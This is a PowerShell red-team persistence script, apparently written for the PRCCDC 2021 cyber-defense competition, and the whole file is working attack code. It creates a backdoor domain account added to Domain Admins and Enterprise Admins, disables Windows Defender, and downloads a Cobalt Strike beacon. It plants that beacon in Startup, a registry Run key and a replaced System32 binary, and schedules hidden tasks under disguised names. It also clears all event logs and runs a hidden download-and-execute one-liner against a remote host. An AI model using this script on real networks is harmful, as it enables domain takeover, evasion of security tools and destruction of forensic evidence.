# Author: Michael Wurner  @psyc0de
# Description: Developed for PRCCDC competition 2021. Multiple persistence methods combined into one script. Often in PRCCDC the Red Team will compromise
#              the DA credentials early on which is why the first module creates a new user and adds to multiple high prilage groups. Following modules download
#              a C2 beacon, add to startup folders, create schedule task to copy the file to different directories and execute. The goal of this script was to create
#              a fast method to add persistence to all hosts in the network. From remote access to 6 types of persistence is about 10 seconds.
#              Finally the script creates exception folder, disables Windows Defender, and clears event logs.

# Create new domain user and add to domain groups Administrators, Remote Desktop, Domain Admins, Enterprise Admins.
$Username = "SQL_Admin"
$Password = 'SQLAdmin@123'

$group = "Administrators"
$group2 = "Remote Desktop Users"
$group3 = "Domain Admins"
$group4 = "Enterprise Admins"
$ErrorActionPreference = "Continue"
$adsi = [ADSI]"WinNT://$env:COMPUTERNAME"
$existing = $adsi.Children | where {$_.SchemaClassName -eq 'user' -and $_.Name -eq $Username }

# Add new local admin user
if ($existing -eq $null) {
    $error.clear()
    try {
    Write-Host "Creating new local user $Username."
    & NET USER $Username $Password /add /y /expires:never
    
    Write-Host "Adding local user $Username to $group."
    & NET LOCALGROUP $group $Username /add

    Write-Host "Adding local user $Username to $group2."
    & NET LOCALGROUP $group $Username /add
    }
    catch { "[-] Failed to add local user" }
    if (!$error) { "[+] Local User Added Successfully" }

# Add new Domain Admin User
    $error.clear()
    try {
        Write-Host "Attempting to add user to domain"
        & Net USER $Username $Password /add /domain

        Write-Host "Adding domain user $Username to $group3."
        & NET GROUP $group3 $Username /add /domain

# Add new Enterprise Admin User
        Write-Host "Adding domain user $Username to $group4."
        & NET GROUP $group4 $Username /add /domain
    }
    catch {
        "[-]User could not be added to domain"
    }
    if (!$error) { "[+]User Added to Domain Successfully" }

}
else {
    Write-Host "Setting password for existing local user $Username."
    $existing.SetPassword($Password)
}

Write-Host "Ensuring password for $Username never expires."
& WMIC USERACCOUNT WHERE "Name='$Username'" SET PasswordExpires=FALSE
# Create exclusion for all of C:\ Disable Defender Real Time Monitoring
try {
    New-Item -Path "c:\" -Name "logfiles" -ItemType "directory" 
    Set-MpPreference -ExclusionPath C:\logfiles
    Set-MpPreference -DisableRealtimeMonitoring $true
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
}
catch {
    "[-] Failed to update Windows Defender"
}
if (!$error) { "[+] Disabled Windows Defender!" }

# download of Cobalt Strike Binary
$error.clear()
try {
    Invoke-WebRequest -Uri "[url]" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\hh.exe"
    }
catch { "[-] File Download Failed" }
if (!$error) { "[+] File Download Successful" }

# Copy CS binary to Temp folder
$error.clear()
try {
    Copy-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\hh.exe" -Destination "C:\logfiles\browserstart.exe" -Force }
catch { "[-] Failed to copy binary to C:\logfiles" }
if (!$error) { "[+] Binary copied to c:\logfiles Successful" }

# Edit Registery Key RunServices to execute CS Beacon on Logon
try { 
     reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServiceOnce" /v ScoreBots /t REG_SZ /d "C:\logfiles\browserstart.exe" 
    }
catch { "[-] Registry Edit Failed" }
if (!$error) { "[+] Registery Key RunServices Edited Successfully" }

# Replace existing system32 binary with CS binary
try {
    Get-Acl c:\users\public | Set-Acl c:\Windows\System32
    Move-Item -Path C:\Windows\System32\esentutl.exe -Destination C:\Windows\System32\esentutl-old.exe -Force
    Copy-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\hh.exe" -Destination "C:\Windows\System32\esentutl.exe"
    }
catch {
    "[-] Failed to replace esentutl.exe"
    }
if (!$error) { "[+] User Added to Domain Successfully" }

# Create Scheduled Task to execute replaced system32 binary upon logon
try {
    $taskAction = New-ScheduledTaskAction -Execute 'C:\Windows\System32\esentutl.exe'
    $taskTrigger = New-ScheduledTaskTrigger -AtLogon
    Register-ScheduledTask SCOREB0T -Action $taskAction -Trigger $taskTrigger
    }
catch {
    "[-] Failed to create scheduled task"
    }
if (!$error) { "[+] Scheduled Task Created!" }

# Clear all logs
try {
    Clear-EventLog "Windows PowerShell"
    Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
    }
catch { "Logs failed to clear" }
if (!$error) { "[+] Successfully Cleared Logs!" }

# CS One Liner for fast connection
try {
    Start-Process -FilePath "powershell" -ArgumentList "-nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('https://subdomain.cloudfront.net:443/prccdc'))"
}
catch {
    "[-] Failed to run beacon 1 liner"
}
if (!$error) { "[+] Successfully Launched One Liner!" }

# Create Scheduled Task to disable Wind Def every minute
try {
    $ssc1 = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-nop -w hidden -c "Set-MpPreference -DisableRealtimeMonitoring $true; New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force"'
    $ssct = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)
    Register-ScheduledTask -Action $ssc1 -Trigger $ssct -TaskName "Windows Updating" -Description "Updates Windows Security"
    }
catch { "Failed to Create Windows Defender Scheduled Task" }
if (!$error) { "[+] Task scheduled to disable Windows Defender every minute!" }

# Clear all logs
try {
    Clear-EventLog "Windows PowerShell"
    Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
    }
catch { "Logs failed to clear" }
if (!$error) { "[+] Successfully Cleared Logs!" }
